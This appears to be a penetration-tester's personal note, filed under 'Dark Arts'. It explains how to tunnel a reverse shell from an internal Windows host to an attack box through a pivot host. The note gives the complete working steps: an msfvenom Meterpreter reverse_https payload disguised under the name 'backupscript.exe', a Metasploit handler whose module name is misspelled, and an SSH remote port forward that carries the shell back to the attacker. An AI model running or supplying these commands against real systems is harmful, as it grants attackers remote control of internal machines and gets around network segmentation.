-- -
Presented as a way to get a reverse shell from an internal host to your attack host that is not connected to the internal network directly. You will be tunneling the reverse shell through a pivot host you control. 
### Steps
1. Create payload for reverse shell from target internal host to the pivot host
2. File transfer payload to pivot host, then to the target internal host
3. Setup listener on attack host
4. Setup port forward from pivot box to attack box
5. Execute payload on target internal host, tunnel should send the shell back to your listener on your attackbox
### Execution
1. Create the payload on attack box:
```bash 
msfvenom -p windows/x64/meterpreter/reverse_https lhost=<pivotbox internal ip> lport=8080 -f exe -o backupscript.exe
```
2. [[Dark Arts/File Transfer/~Home|File Transfer]] payload to pivot box, and then to the target internal host.
3. Setup attack box listener
```bash
msfconsole
use exploit/muli/handler
set lhost 0.0.0.0
set lport 8000
run
```
4. Setup remote port forward, from attack box
```bash
# -vN: verbose, no login prompt
# -R: Asks pivot box to listen on port 8080 and forward traffic to our attack host on port 8000
ssh -R <pivot host ip>:8080:0.0.0.0:8000 <user>@<pivot IP> -vN
```
5. Execute the payload on the internal target host, you should get a shell on your meterpreter listener. 